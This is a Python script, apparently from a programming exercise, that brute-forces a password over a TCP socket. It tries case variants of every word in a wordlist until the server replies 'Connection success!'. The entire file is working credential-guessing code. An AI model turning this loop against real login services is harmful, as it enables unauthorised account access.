import sys
import socket
import itertools

passwords_list = []

with open('hacking/passwords.txt', 'r', encoding='utf-8') as f:
    for line in f:
        passwords_list.append(line.strip())

address = (sys.argv[1], int(sys.argv[2]))


def generate_password():
    for password in passwords_list:
        yield from itertools.product(*zip(password.lower(), password.upper()))


with socket.socket() as sock:
    sock.connect(address)

    for p in generate_password():
        password = "".join(p)
        sock.send(password.encode())

        response = sock.recv(1024).decode()
        if response == 'Connection success!':
            print(password)
            break
        if response == 'Wrong password!':
            continue
        if response == 'Too many attempts':
            print(response)
            break
